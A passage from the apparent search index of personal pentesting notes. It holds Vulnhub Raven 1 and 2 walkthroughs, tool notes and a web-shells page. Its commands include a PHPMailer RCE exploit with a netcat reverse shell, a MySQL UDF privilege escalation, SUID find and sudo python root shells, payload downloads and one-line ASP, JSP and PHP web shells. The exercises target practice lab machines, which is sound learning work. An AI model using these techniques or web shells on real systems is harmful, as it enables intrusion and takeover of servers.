os; os.system(\"/bin/sh\")'\n</code></pre> <p>See the results:</p> <p></p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#getting-the-flags","title":"Getting the flags","text":"<p>Printing flags now is not difficult at all:</p> <pre><code>find . -name flag*.txt 2&gt;/dev/null \n</code></pre> <p>And results:</p> <pre><code>./var/www/flag2.txt\n./root/flag4.txt\n</code></pre> <p>We can print them now:</p> <p><pre><code>cat /var/www/flag2.txt\n</code></pre> Results:</p> <pre><code>flag2{fc3fd58dcdad9ab23faca6e9a36e581c}\n</code></pre> <pre><code>cat /root/flag4.txt\n</code></pre> <p>Results:</p> <pre><code>______                      \n\n| ___ \\                     \n\n| |_/ /__ ___   _____ _ __  \n\n|    // _` \\ \\ / / _ \\ '_ \\ \n\n| |\\ \\ (_| |\\ V /  __/ | | |\n\n\\_| \\_\\__,_| \\_/ \\___|_| |_|\n\n\nflag4{715dea6c055b9fe3337544932f2941ce}\n\nCONGRATULATIONS on successfully rooting Raven!\n\nThis is my first Boot2Root VM - I hope you enjoyed it.\n\nHit me up on Twitter and let me know what you thought: \n\n@mccannwj / wjmccann.github.io\n</code></pre> <p></p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#commands-and-tools","title":"Commands and tools","text":"","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#commands-used-to-exploit-the-machine","title":"Commands used to exploit the machine","text":"<pre><code>sudo netdiscover -i eth1 -r 192.168.56.102/24\nsudo nmap -p- -A 192.168.56.104\ndirb http://192.168.56.104\nwpscan --url http://192.168.56.104/wordpress --enumerate u --force --wp-content-dir wp-content\necho \"192.168.56.104    local.raven\" sudo &gt;&gt; /etc/hosts\nwpscan --url http://192.168.56.104/wordpress --passwords /usr/share/wordlists/rockyou.txt  --user steven -t 25\nssh steven@192.168.56.104\nsudo python -c 'import os; os.system(\"/bin/sh\")'\nfind . -name flag*.txt 2&gt;/dev/null\n</code></pre>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#tools","title":"Tools","text":"<ul> <li>dirb.</li> <li>netdiscover.</li> <li>nmap.</li> <li>wpscan.</li> </ul>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/","title":"Walkthrough: Raven 2, a vulnhub machine","text":"","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#about-the-machine","title":"About the machine","text":"data Machine Raven 2 Platform Vulnhub url link Download https://drive.google.com/open?id=1fXp4JS8ANOeClnK63LwgKXl56BqFJ23z Download Mirror https://download.vulnhub.com/raven/Raven2.ova Size 765 MB Author William McCann Release date 9 November 2018 Description Raven 2 is an intermediate level boot2root VM. There are four flags to capture. After multiple breaches, Raven Security has taken extra steps to harden their web server to prevent hackers from getting in. Can you still breach Raven? Difficulty Intermediate OS Linux","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#walkthrough","title":"Walkthrough","text":"","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#setting-up-the-machines","title":"Setting up the machines","text":"<p>I'll be using Virtual Box.</p> <p>Kali machine (from now on: attacker machine) will have two network interfaces: </p> <ul> <li>eth0 interface: NAT mode (for internet connection).</li> <li>eth1 interface: Host-only mode (for attacking the victim machine).</li> </ul> <p>Raven 1 machine (from now on: victim machine) will have only one network interface:</p> <ul> <li>eth0 interface.</li> </ul> <p>After running </p> <p><pre><code>ip a\n</code></pre> we know that the attacker's machine IP address is 192.168.56.102/24. </p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#reconnaissance","title":"Reconnaissance","text":"","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#identify-victims-ip","title":"Identify victim's IP","text":"<p>To discover the victim's machine IP, we run:</p> <pre><code>sudo netdiscover -i eth1 -r 192.168.56.102/24\n</code></pre> <p>These are the  results:</p> <p></p> <p>Usually, victim's IP is the last one listed, in this case 192.168.56.104, BUT as this lab was performed in several days, victim's machine IP will switch eventually to 192.168.56.105. </p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#scan-victims-surface-attack","title":"Scan victim's surface attack","text":"<p>Now we can run a scanner to see which services are running on the victim's machine:</p> <pre><code>sudo nmap -p- -A 192.168.56.104\n</code></pre> <p>And the results:</p> <p></p> <p>Having a web server in port 80, it's inevitable to open a browser and have a look at it. Also, at the same time, we can run a simple enumeration scan with dirb:</p> <p><pre><code>dirb http://192.168.56.104\n</code></pre> By default, dirb is using /usr/share/dirb/wordlists/common.txt. The results are pretty straightforward:</p> <p></p> <p>There are two folders quite appealing: </p> <ul> <li>A wordpress installation running on the server. </li> <li>A vendor installation with a service such as PHPMailer installed.</li> </ul>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#deeper-scan-with-specific-tool-for-wordpress-service-wpscan","title":"Deeper scan with specific tool for wordpress service: wpscan","text":"<p>First, let's start by running a much deeper scanner with wpscan. We'll be enumerating users, </p> <pre><code>wpscan --url http://192.168.56.104/wordpress --enumerate u --force --wp-content-dir wp-content\n</code></pre> <p>And the results show us some interesting findings:</p> <p></p> <p></p> <p>Main findings:</p> <ul> <li>XML-RPC seems to be enabled: http://192.168.56.104/wordpress/xmlrpc.php. What does this service do? It allows authentication to post entries. It's also useful in wordpress for retrieving pings when a post is linked back. This means that it's also an open door for exploitation. We'll return to this lateri.</li> <li>WordPress readme found: http://raven.local/wordpress/readme.html</li> <li>Upload directory has listing enabled: http://raven.local/wordpress/wp-content/uploads/.</li> <li>WordPress version 4.8.7.</li> <li>WordPress theme in use: twentyseventeen.</li> <li>Enumerating Users: michael, steven.</li> </ul> <p>Opening the browser in http://192.168.56.104/wordpress/readme.html, we can see some instructions to set up the wordpress installation. As a matter of fact, by clicking on http://192.168.56.105/wp-admin/install.php, we end up on a webpage with the source code pointing to raven.local. We need to include a redirection in our /etc/hosts file. (This is better explained in the vulnhub raven 1 machine.  </p> <pre><code>sudo nano /etc/hosts\n</code></pre> <p>At the  end of the file we add the following line:</p> <pre><code>192.168.56.104  local.raven\n# CTRL-s  and CTRL-x\n</code></pre> <p>There was another open folder: http://raven.local/wordpress/wp-content/uploads/. Using the browser we can get to </p> <p></p> <p>And now we have flag3:</p> <p></p> <p>Let's see now the user enumeration. Yoy can go to the walkthrough of the Vulnhub Raven 1 machine to see how to manually brute force users in a wordpress installation.  </p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#exploiting-findings","title":"Exploiting findings","text":"","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#bruce-forcing-passwords-for-the-cms","title":"Bruce-forcing passwords for the CMS","text":"<p>Having found anything, after testing input validations in the endpoints of the application, </p> <p>I'm going to try to brute force login with steven, who is the user with id=2.</p> <pre><code>wpscan --url http://192.168.56.105/wordpress --passwords /usr/share/wordlists/rockyou.txt  --usernames steven -t 25\n</code></pre> <p>And also with michael:</p> <pre><code>wpscan --url http://192.168.56.105/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames michael -t 25\n</code></pre> <p>No valid password is found.</p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#browse-listable-folders-that-are-supposed-to-be-close","title":"Browse listable folders that are supposed to be close","text":"<p>Besides the wordpress installation, our dirb scan gave us another interesting folder: http://192.168.56.105/vendor. Browsing around you can find the service PHPMailer installed.</p> <p></p> <p>Two insteresting findings regarding the PHPMailer service:</p> <p>One is the file PATH, with the the path to the service and other of the flags:</p> <p></p> <p>In plain text:</p> <pre><code>/var/www/html/vendor/\nflag1{a2c1f66d2b8051bd3a5874b5b6e43e21}\n</code></pre> <p>The second is the file VERSION, that reveals that the PHPMailer service has version 5.2.16, which is potentially vulnerable,.</p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#exploiting-the-service-phpmailer-5216","title":"Exploiting the service PHPMailer 5.2.16","text":"<p>After googling \"phpmailer 5.2.16 exploit\", we have these results:</p> <ul> <li>https://www.exploit-db.com/exploits/40974.</li> </ul> <p>What is this vulnerability about? Quoting Legalhackers:</p> <p>An independent research uncovered a critical vulnerability in PHPMailer that could potentially be used by (unauthenticated) remote attackers to achieve remote arbitrary code execution in the context of the web server user and remotely compromise the target web application. To exploit the vulnerability an attacker could target common website components such as contact/feedback forms, registration forms, password email resets and others that send out emails with the help of a vulnerable version of the PHPMailer class.</p> <p>When it comes to Raven 2 machine, we realize that we're using a contact form from: </p> <p></p> <p>We can use the exploit from https://www.exploit-db.com/exploits/40974. </p> <p>Originally, this exploit is (highlighted the fields we're going to change):</p> <p></p> <p>And this is the anarconder.py saved with execution permissions in our attacker machine (hightlighted my changes to the original script):</p> <p></p> <p>We launch the script:</p> <pre><code>python3 anarconder.py\n</code></pre> <p>And open in listening mode port 4444  with netcat:</p> <pre><code>nc -lnvc 4444\n</code></pre> <p>Now, I will open in the browser http://192.168.56.105/zhell.php to get the reverse shell in my netcat conection.</p> <p></p> <p>And we can browse to /var/www and get flag2.txt</p> <p></p> <p>flag2.txt in plain text:</p> <pre><code>flag2{6a8ed560f0b5358ecf844108048eb337}\n</code></pre> <p>Also, a nice-thing-to-do on every wordpress installation is checking out for credentials in the config file (if existing). So by browsing to /var/www/html/wordpress, we can see:</p> <p></p> <p>And reading the file, we can see some credentials:</p> <pre><code>cat wp-config.php\n</code></pre> <p></p> <p>So now we also have these credentials:</p> <ul> <li>user: root</li> <li>password: R@v3nSecurity</li> </ul> <p>We can try to access ssh service running on port 22 with those credentials, without success. We can also try to escalate from the open shell, but we get the message that \"su root must be run from terminal\".</p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#escalation-of-privileges","title":"Escalation of privileges","text":"<p>First, let's see who we are (id), to which groups we belong (id), the version of the running server (uname -a),  and which commands we are allowed to run (sudo -l). </p> <p></p> <p>Also there are some nice tools that we could run in the victim machine if we have python installed. Let's make a comprobation:</p> <p><pre><code>which python\n</code></pre> Result:</p> <pre><code>/usr/bin/python\n</code></pre> <p>Nice, let's proceed: There is a cool enumeration tool for linux called Linux Privilege Cheker, that we can download from the referenced github repo and serve it from our attacker machine:</p> <pre><code>cp linuxprivchecker.py /var/www/html\ncd /var/www/html\nservice apache2 start\n</code></pre> <p>And then, from the victim machine:</p> <pre><code>cd /tmp\nwget http://192.168.56.102/linuxprivchecker.py\n</code></pre> <p>Now we can run it and see the results:</p> <pre><code>python /tmp/linuxprivchecker.py\n</code></pre> <p>Once you run it, you will get this enumeration of escalation exploits. Since potentially we have some root credentials for a service, we will try with the MYSQL vulnerability 4.X/5.0. </p> <p></p> <p>After reviewing the exploit http://www.exploit-db.com/exploits/1518, we copy-paste the exploit and save it as 1518.c in our apache server:</p> <pre><code>cd /var/www/html/\nvi 1518.c\n# and we copy paste the exploit\n</code></pre> <p>Compiling this C code in the victim attack gives us error.</p> <p> </p> <p>Then, we are going to compile in the attacker machine.</p> <pre><code># To creates 1518.o from 1518.c\nsudo gcc -g -c 1518.c\n\n# To create 1518.so from both 1518.c and 1518.o\nsudo gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc \n</code></pre> <p>The file we are going to retrieve from the victim machine is 1518.so. So from /tmp in the victim machine:</p> <pre><code>cd /tmp\nwget http://192.168.56.102/1518.so\n</code></pre> <p>Now in the victim machine, we login into MSQL service:</p> <pre><code>mysql -u root -p\n\n# when asked about password, we enter R@v3nSecurity\n</code></pre> <p>We're in! Let's do some digging:</p> <pre><code># List databases\nSHOW databases;\n\n# Select a database\nuse mysql;\n</code></pre> <p>Exploiting the vulnerability: we'll create a table in the database, with a column, and we will assing a value to that column that it's going to be our payload file with the extension .so.</p> <pre><code>create table foo(line blob);\ninsert into foo values(load_file('/tmp/1518.so'));\n</code></pre> <p>So far:</p> <p>![Mysql capture](img(raven2-19.png)</p> <p>Now, we are going to load that file from the column to a different location, let's say /usr/lib/mysql/plugin/1518.so:</p> <pre><code>select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';\n\n# We will execute\ncreate function do_system returns integer soname '1518.so';\n</code></pre> <p>If we now execute: </p> <pre><code>select do_system('chmod u+s /usr/bin/find');\nexit\n</code></pre> <p></p> <p>Now, if we check suid binaries, we can see \"find\" among them.</p> <p></p> <p>Now, if we create a file, such as \"tocado\" in the /tmp folder of the victim machine and we execute 'find file -exec code', every time that the command finds the file it will execute the following code as root.</p> <p>Then, we can run:</p> <pre><code>touch tocado\nfind tocado -exec \"whoami\" \\;\nfind tocado -exec \"/bin/sh\" \\;\nwhoami\n</code></pre> <p></p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#getting-the-flag","title":"Getting the flag","text":"<p>We just need to go to the root folder:</p> <pre><code>cd /root\nls -la\ncat flag4.txt\n</code></pre> <p></p> <p>flag4.txt in plain text:</p> <pre><code>  ___                   ___ ___ \n | _ \\__ ___ _____ _ _ |_ _|_ _|\n |   / _` \\ V / -_) ' \\ | | | | \n |_|_\\__,_|\\_/\\___|_||_|___|___|\n\nflag4{df2bc5e951d91581467bb9a2a8ff4425}\n\nCONGRATULATIONS on successfully rooting RavenII\n\nI hope you enjoyed this second interation of the Raven VM\n\nHit me up on Twitter and let me know what you thought: \n</code></pre>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#commands-used-to-exploit-the-machine","title":"Commands used to exploit the machine","text":"<pre><code>ip a\nsudo netdiscover -i eth1 -r 192.168.56.102/24\nsudo nmap -p- -A 192.168.56.105\ndirb http://192.168.56.105\nwpscan --url http://192.168.56.105/wordpress --enumerate u --force --wp-content-dir wp-content\npython3 anarconder.py\nnc -lnvc 4444\n\ncat wp-config.php\ncd /tmp\nwget http://192.168.56.102/linuxprivchecker.py\npython /tmp/linuxprivchecker.py\n\n\ncd /var/www/html/\nvi 1518.c\n# and we copy paste the exploit\n\n# To creates 1518.o from 1518.c\nsudo gcc -g -c 1518.c\n\n# To create 1518.so from both 1518.c and 1518.o\nsudo gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc \n\nmysql -u root -p\n\n# List databases\nSHOW databases;\n\n# Select a database\nuse mysql;\n\ncreate table foo(line blob);\ninsert into foo values(load_file('/tmp/1518.so'));\n\nselect * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';\n\n# We will execute\ncreate function do_system returns integer soname '1518.so';\n\nselect do_system('chmod u+s /usr/bin/find');\nexit\n\ntouch tocado\nfind tocado -exec \"whoami\" \\;\nfind tocado -exec \"/bin/sh\" \\;\nwhoami\n</code></pre>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-2/#tools","title":"Tools","text":"<ul> <li>dirb.</li> <li>netdiscover.</li> <li>nmap.</li> <li>wpscan.</li> <li>mysql</li> </ul>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"w3af/","title":"w3af","text":"<p>w3af is a\u00a0Web Application Attack and Audit Framework.</p>","tags":["pentesting","web pentesting"]},{"location":"w3af/#installation","title":"Installation","text":"<p>Download from: https://github.com/andresriancho/w3af.</p> <p>W3af documentation.</p>","tags":["pentesting","web pentesting"]},{"location":"wafw00f/","title":"WafW00f - A firewall scanner","text":"<p>WafW00f is a web application firewall (<code>WAF</code>) fingerprinting tool that sends requests and analyses responses to determine if a security solution is in place. </p> <p>WAFW00F does the following:</p> <ul> <li>Sends a\u00a0normal\u00a0HTTP request and analyses the response; this identifies a number of WAF solutions.</li> <li>If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is.</li> <li>If that is also not successful, it analyses the responses previously returned and uses another simple algorithm to guess if a WAF or security solution is actively responding to our attacks.</li> </ul>","tags":["pentesting","web pentesting","enumeration"]},{"location":"wafw00f/#installation","title":"Installation","text":"<p>We can install it with the following command:</p> <pre><code>sudo apt install wafw00f -y\n</code></pre>","tags":["pentesting","web pentesting","enumeration"]},{"location":"wafw00f/#basic-usage","title":"Basic usage","text":"<pre><code>wafw00f -v https://www.example.com\n\n# -a: check all possible WAFs in place instead of stopping scanning at the first match.\n# -i: read targets from an input file \n# -p proxy the requests \n</code></pre>","tags":["pentesting","web pentesting","enumeration"]},{"location":"walkthroughs/","title":"Index of walkthroughs","text":"","tags":["walkthrough"]},{"location":"walkthroughs/#well-this-is-a-mess","title":"Well, this is a mess","text":"<p>It feels like an eternity since I embarked on my first walkthroughs of the Overthewire game challenges. However, the reality is that this happened just one year ago (or maybe two). During those days, I was consumed by an intense obsession with documenting every single step I took. Allow me to relive and share a snippet of my explanation for progressing from level 31 to level 32 in Bandit so you can draw your own conclusions:</p> Click to keep reading why this is a mess <pre><code>1. mkdir /tmp/amanda31\n2. cd /tmp/amanda31\n3. git clone ssh://bandit31-git@localhost/home/bandit31-git/repo\n4. cd repo\n\n# when listing repo, you can realize that there is a .gitignore file\n5. ls -la\n\n# Print the .gitignore file to see which changes are not being commited\n6. cat .gitignore\n\n# \"*.txt\" files are being excluded from being pushed\n7. cat README.md\n\n# README.md file will provide you with the instructions to pass the level: \"This time your task is to push a file to the remote repository.\n# Details:\n#    File name: key.txt\n#    Content: 'May I come in?'\n#    Branch: master  \"\n\n# Remove \"*.txt\" from .gitignore\"\n8. echo \"\" &gt; .gitignore\n\n# Create a key.txt file\n9. echo \"May I come in?\" &gt; ./.git/key.txt\n\n# Add these changes to the commit\n10. git add -A\n\n# Commit the changes in your repository. A line with the explanation of the changes may be required\n11. git commit\n\n# Push the changes to the server\n12. git push\n\n# In the results of the git push commands, the server will \n# provide the password for the next level.\n</code></pre> <p>Smile on my face. I even commented what \"git push\" or \"cat file.txt\" were executing! XDDDDDDDD</p> <p>I also vividly remember spending A LOT of time doing this. But you know what? I don't care what my colleagues say. All that time was completely worthwhile because it helped me integrate that knowledge into my tired brain. Take, for instance, the walkthrough of vulnhub Goldeneye 1. It took me a while to format and prepare it for sharing (and I did it with the intention of sharing).</p> <p>Now things have changed. I don't do that anymore. I've become selfish. My walkthroughs have transformed into a list of steps linked to tools, tags and concise explanations, solely for the purpose of helping me remember that machine. They are probably only useful to me (not suitable for LinkedIn hahaha). </p> <p>Anyway, at some point, I needed to make this decision. More labs and self-centered documentation? Or more detailed walkthroughs and fewer labs (and consequently falling behind on my goals)? More labs, geee!</p> <p>All of this is just to say that in this repository, you will find incredibly detailed walkthroughs (even with multiple ways of exploiting a machine) along with quick guides containing raw commands. All of them together and for no reason. Please, bear with me!</p>","tags":["walkthrough"]},{"location":"walkthroughs/#updated-list-of-walkthroughs-writeups","title":"Updated list of walkthroughs - writeups","text":"<ul> <li>Vulnhub GoldenEye 1</li> <li>Vulnhub Raven 1</li> <li>Vulnhub Raven 2</li> <li>HTB appointment</li> <li>HTB archetype</li> <li>HTB bank</li> <li>HTB base</li> <li>HTB crocodile</li> <li>HTB explosion</li> <li>HTB friendzone</li> <li>HTB funnel</li> <li>HTB included</li> <li>HTB Greenhorn</li> <li>HTB ignition</li> <li>HTB lame</li> <li>HTB markup</li> <li>HTB metatwo</li> <li>HTB mongod</li> <li>HTB nibbles</li> <li>HTB nunchucks</li> <li>HTB omni</li> <li>HTB oopsie</li> <li>HTB pennyworth</li> <li>HTB photobomb</li> <li>HTB popcorn</li> <li>HTB redeemer</li> <li>HTB responder</li> <li>HTB sequel</li> <li>HTB support</li> <li>HTB tactics</li> <li>HTB trick</li> <li>HTB undetected</li> <li>HTB unified</li> <li>HTB usage</li> <li>HTB vaccine</li> </ul>","tags":["walkthrough"]},{"location":"waybackurls/","title":"waybackurls","text":"<p>waybackurls inspects back URLs saved by Wayback Machine and look for specific keywords. </p>","tags":["pentesting","reconnaissance","tools"]},{"location":"waybackurls/#installation","title":"Installation","text":"<pre><code>go install github.com/tomnomnom/waybackurls@latest\n</code></pre>","tags":["pentesting","reconnaissance","tools"]},{"location":"waybackurls/#basic-usage","title":"Basic usage","text":"<pre><code>waybackurls -dates https://example.com &gt; waybackurls.txt\n\ncat waybackurls.txt\n</code></pre>","tags":["pentesting","reconnaissance","tools"]},{"location":"web-services/","title":"Pentesting web services","text":"","tags":["pentesting","webservices","soap"]},{"location":"web-services/#web-services-vs-web-applications","title":"Web services vs. Web applications","text":"<ul> <li>Interoperability: Web services promote interoperability by providing a standardized way for applications to communicate.  They rely on open standards like HTTP, XML, SOAP, REST, and JSON to ensure compatibility.</li> <li>Platform-agnostic: Web services are not tied to a specific  operating system or programming language. They can be  developed in various technologies, making them versatile and accessible.</li> </ul>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#web-services-vs-apis","title":"Web services vs. APIs","text":"<p>Web services and APIs (Application Programming Interfaces) are related concepts in web development, but they have distinct differences.  Web services are a broader category of technologies used to enable machine-to-machine communication and data exchange over the internet. They encompass various protocols and data  formats. APIs, on the other hand, are a set of rules and tools that allow developers to access the functionality or data of a service, application, or platform.</p> <p></p>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#implementation-of-web-services","title":"Implementation of web services","text":"<p>Web service implementations refer to the different ways in which web services can be created, deployed, and used. There are several methods and technologies  available for implementing web services.</p> <ul> <li>SOAP (Simple Object Access Protocol): SOAP is a protocol for exchanging structured information in the implementation of web services. SOAP-based web services use XML as their message format and can be implemented using various programming languages.</li> <li>JSON-RPC and XML-RPC: JSON-RPC and XML-RPC are lightweight protocols for remote procedure calls (RPC) using JSON or XML, respectively. These are simpler alternatives to SOAP for implementing web services. </li> <li>REST (Representational State Transfer): REST is an architectural style for designing networked applications, and it uses HTTP as its communication protocol.</li> </ul>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#xml-rpc","title":"XML-RPC","text":"<ul> <li>XML-RPC (Extensible Markup Language - Remote Procedure Call) created in 1998, is a protocol and a set of conventions for encoding and decoding data in XML  format and using it for remote procedure calls (RPC). </li> <li>It is a simple and lightweight protocol for enabling communication between  software applications running on different systems, often over a network like the internet.</li> <li>XML-RPC has been used as a precursor to more modern web service protocols like SOAP and REST. </li> <li>It works by sending HTTP requests that call a single method implemented on the remote system.</li> </ul>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#json-rpc","title":"JSON-RPC","text":"<ul> <li>JSON-RPC (Remote Procedure Call) is a remote procedure call (RPC) protocol encoded in JSON (JavaScript Object Notation). </li> <li>Like XML-RPC, JSON-RPC enables communication between software components or systems running on different machines or platforms.</li> <li>JSON-RPC is known for its simplicity and ease of use and has become popular in web development and microservices architectures.</li> <li>JSON-RPC is very similar to XML-RPC, however, it is usually used because it provides much more human-readable messages and takes less data to for communication.</li> <li>JSON-RPC allows a client to invoke methods or functions on a remote server by sending a JSON object that specifies the method to call and its parameters.</li> <li>The message sent to invoke a method is a request with a single object serialized using JSON. It has three properties:<ul> <li>method: name of the method to invoke </li> <li>params: an array of objects to pass as arguments </li> <li>id: request ID used to match the responses/requests</li> </ul> </li> </ul>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#soap","title":"SOAP","text":"<p>SOAP (Simple Object Access Protocol) is a protocol for exchanging structured information in the implementation of web services. It is a protocol that defines a set of rules and conventions for structuring messages, defining remote procedure calls (RPC), and handling communication between software components over a network, typically the internet.</p> <p>SOAP is seen as the natural successor to XML-RPC and is known for its strong typing and extensive feature set, which includes security, reliability, and transaction support.</p> <p>SOAP Web Services may also provide a Web Services Definition language (WSDL) declaration that specifies how they may be used or interacted with.</p> <p></p>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#rest-restful-apis","title":"REST (RESTful APIs)","text":"<p>REST, which stands for Representational State Transfer, is an architectural style for designing networked applications. It is not a protocol or technology itself but rather a set of principles and constraints that guide the design of web services and APIs (Application Programming Interfaces).</p> <p>REST is widely used for building scalable, stateless, and easy-to-maintain web services/APIs that can be accessed over the internet. REST web services generally use JSON or XML, but any other message transport format like plain-text can be used.</p>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#wsdl-language-fundamentals","title":"WSDL Language Fundamentals","text":"<p>WSDL, which stands for Web Services Description Language, is an XML-based language used to describe the functionality and interface of a web service, typically, SOAP-based web services (Simple Object Access Protocol).</p> <p>Versions: At the time of writing, WSDL can be distinguished in two main versions: 1.1 and 2.0. Although 2.0 is the current version, many web services still use WSDL 1.1.</p>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#the-wsdl-document","title":"The WSDL Document","text":"<p>A WSDL document is typically created to describe a SOAP-based web service. It defines the service's operations, their input and output message structures, and how they are bound to the SOAP protocol. </p> <p>First of all, it is important to know that WSDL documents have abstract and concrete definitions:</p> <ul> <li>Abstract: describes what the service does, such as the operation provided, the input, the output and the fault messages used by each operation </li> <li>Concrete: adds information about how the web service communicates and where the functionality is offered</li> </ul> <p>The WSDL document effectively documents the API provided by the service. The WSDL document serves as a contract between the service provider and consumers. It specifies how clients should construct SOAP requests to interact with the service. This contract defines the operations, their input parameters, and expected responses.</p>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#wsdl-components","title":"WSDL components","text":"<ul> <li>Types: The <code>&lt;types&gt;</code> section defines the data types used in the web service. It typically includes XML Schema Definitions (XSD) that specify the structure and constraints of input and output data.</li> <li>Message: The <code>&lt;message&gt;</code> element defines the data structures used in the messages exchanged between the client and the service. Messages can have multiple parts, each with a name and a type definition referencing the types defined in the <code>&lt;types&gt;</code> section.</li> <li>Port Type: The <code>&lt;portType&gt;</code> element describes the operations that the web service supports. Each operation corresponds to a method or function that a client can invoke. It specifies the input and output messages for each operation.          The operation object defined within a port type, represents a specific action that a service can perform. It specifies the name of the operation, the input message structure, the output message structure, and, optionally, fault messages that can occur during the operation.     </li> <li>Binding: The <code>&lt;binding&gt;</code>  element specifies how the service operations are bound to a particular protocol, such as SOAP over HTTP. It defines details like the protocol, message encoding, and endpoint addresses.     </li> <li>Service: The <code>&lt;service&gt;</code> element provides information about the service itself. It includes the service's name and its endpoint address, which is the URL where clients can access the service.</li> </ul> <p>Instead of portType, WSDL v. 2.0 uses interface elements which define a set of operations representing an interaction between the client and the service. Each operation specifies the types of messages that the service can send or receive. </p> <p>Unlike the old portType, interface elements do not point to messages anymore (it does not exist in v. 2.0). Instead, they point to the schema elements contained within the types element</p>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#web-service-security-testing","title":"Web Service Security Testing","text":"<p>Web service security testing is the process of evaluating the security of web services to identify vulnerabilities, weaknesses, and potential threats that could compromise the confidentiality, integrity, or availability of the service or its data.</p>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#information-gathering-and-analysis","title":"Information Gathering and Analysis","text":"<p>1. Identify the SOAP web services that need to be tested. </p> <p>2. Identify the WSDL file for the SOAP web service. </p> <p>Once the SOAP service has been identified, a way to discover WSDL files is by appending ?wsdl,.wsdl, ?disco or wsdl.aspx to the end of the service URL:</p> <p></p> <p>3. With WSDL document identified we may gather information about the web service endpoints, operations, and data exchanged. </p> <p></p> <p></p> <p></p> <p>4. Understand the security requirements, authentication methods, and authorization mechanisms in place. </p>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#authentication-and-authorization-testing","title":"Authentication and Authorization Testing","text":"<p>Invoke hidden methods</p> <p></p> <p></p> <ul> <li>Test the authentication mechanisms in place (e.g., username/password, tokens) to ensure they prevent unauthorized access. </li> <li>Verify that users are correctly authenticated and authorized to access specific operations and resources. </li> <li>Input Validation Testing: <ul> <li>Test for input validation vulnerabilities, such as SQL injection, cross-site scripting (XSS), and XML-based attacks. </li> </ul> </li> </ul> <p></p> <p></p> <ul> <li>Send malicious input data to the web service's input parameters to identify potential security weaknesses. For instance, command injection attacks:</li> </ul> <p></p> <p></p>","tags":["pentesting","webservices","soap"]},{"location":"web-services/#the-soapaction-header","title":"The SOAPAction header","text":"<p>The SOAPAction header is a transport protocol header (either HTTP or JMS). It is transmitted with SOAP messages, and provides information about the intention of the web service request, to the service. The WSDL interface for a web service defines the SOAPAction header value used for each operation. Some web service implementations use the SOAPAction header to determine behavior.</p> <p></p> <p></p>","tags":["pentesting","webservices","soap"]},{"location":"web-shells/","title":"Web shells","text":"All about shells Shell Type Description <code>Reverse shell</code> Initiates a connection back to a \"listener\" on our attack box. <code>Bind shell</code> \"Binds\" to a specific port on the target host and waits for a connection from our attack box. <code>Web shell</code> Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a\u00a0<code>PHP</code>\u00a0script to run a single command. <p>Preconfigured webshells in Kali linux</p> <p>Go to /usr/share/webshells/</p> Other resources <p>See reverse shells</p> <p>A Web Shell is typically a web script that accepts our command through HTTP request parameters, executes our command, and prints its output back on the web page.</p> <p>A web shell script is typically a one-liner that is very short and can be memorized easily.</p>","tags":["pentesting","webshell","reverse-shells"]},{"location":"web-shells/#some-basic-web-shells","title":"Some basic web shells","text":"","tags":["pentesting","webshell","reverse-shells"]},{"location":"web-shells/#asp","title":"asp","text":"<pre><code>&lt;% eval request(\"cmd\") %&gt;\n</code></pre>","tags":["pentesting","webshell","reverse-shells"]},{"location":"web-shells/#jsp","title":"jsp","text":"<pre><code>&lt;% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %&gt;\n</code></pre>","tags":["pentesting","webshell","reverse-shells"]},{"location":"web-shells/#php","title":"php","text":"<pre><code>&lt;?php system($_REQUEST[\"cmd\"]); ?&gt;\n</code></pre> <ul> <li>Pentesmonkey webshell.</li> <li>WhiteWinterWolf webshell.</li> </ul>","tags":["pentesting","webshell","reverse-shells"]},{"location":"web-shells/#how-to-exploit-a-web-shell","title":"How to exploit a web shell","text":"","tags":["pentesting","webshell","reverse-shells"]},{"location":"web-shells/#file-upload-vs-remote-code-execution","title":"File upload vs Remote code execution","text":"<p>1. FILE UPLOAD: By abusing an upload feature. We would place this web shell script into the 